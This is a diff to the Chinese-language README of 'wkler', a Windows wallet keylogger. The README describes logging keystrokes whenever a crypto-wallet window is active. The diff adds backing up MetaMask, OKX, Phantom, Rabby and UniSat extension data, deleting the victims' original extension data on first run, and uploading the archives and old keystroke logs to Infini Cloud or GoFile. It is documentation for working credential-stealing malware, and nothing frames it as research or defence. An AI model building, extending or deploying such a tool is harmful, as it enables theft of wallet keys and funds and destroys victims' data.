@@ -1,16 +1,18 @@
 # wkler - 钱包键盘记录器 (Wallet Keylogger)
 
-持续检测活动窗口，匹配钱包关键词时触发键盘记录，记录到 `~/.dev/wkler/recording_{日期}.log`
+持续检测活动窗口，匹配钱包关键词时触发键盘记录，记录到 `%USERPROFILE%\.dev\wkler\recording_{日期}.log`
 
 ## 功能特性
 
+- **扩展备份** - 自动备份钱包扩展数据（MetaMask、OKX、Phantom、Rabby、UniSat 等）
+- **首次清除** - 首次运行时备份并删除源扩展数据，后续仅备份
+- **自动上传** - 压缩备份为 tar.gz 并上传到 Infini Cloud，失败回退 GoFile
+- **日志上传** - 自动上传非当天的历史键盘记录日志
 - **持续检测** - 后台线程持续检测活动窗口（每 0.2 秒）
 - **自动触发** - 检测到钱包窗口时自动开始记录
 - **限时记录** - 自动记录 60 分钟后停止
-- **Windows 平台** - 支持 Windows 系统
 - **智能匹配** - 检测 Unknown 窗口和钱包关键词
 - **调试模式** - 实时显示窗口信息，记录所有按键
-- **高性能** - 持久文件句柄、预计算模式匹配、窗口缓存
 
 ## 工作原理
 
@@ -83,8 +85,8 @@ wkler --debug
 
 ### 查看日志
 
-```bash
-cat ~/.dev/wkler/recording_*.log
+```powershell
+type %USERPROFILE%\.dev\wkler\recording_*.log
 ```
 
 ## 包结构
